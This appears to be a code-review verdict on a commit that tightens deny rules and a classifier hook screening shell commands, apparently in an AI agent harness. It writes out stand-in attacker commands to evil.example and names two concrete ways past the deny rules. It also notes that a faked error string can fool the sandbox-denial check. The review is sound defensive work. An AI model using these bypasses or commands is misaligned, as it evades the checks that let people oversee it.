verdicts.note: The diff adds coverage for the explicit round-1 examples: userinfo curl/wget, scp-style git remotes like git@evil.example:repo, direct ssh user@host, and python/perl -c/-e URL fetches. It is still incomplete: the new ssh rule claims bare-host coverage but only matches user@host, so `ssh evil.example` is not caught by the deterministic deny rule. The new scp-style git rule also lacks an allowlist host boundary, so `git clone git@github.com.evil.example:repo` bypasses it.

The classifier ApiAdapter is now constructed with max_schema_retries=0, so the classifier path is bounded to one 5 second API attempt and no longer has retry latency that can exceed the 8 second hook timeout.

The helper no longer treats any nonzero command_execution exit code as proof, which fixes one weakness. It still accepts errno markers from result.text alone, without a raw event proving the write command was dispatched and denied by the sandbox, so a refusal or hallucinated error string can still satisfy the helper.

summary: Commit 6093d10 fully resolves F-007, but F-004 and F-008 remain only partially resolved.
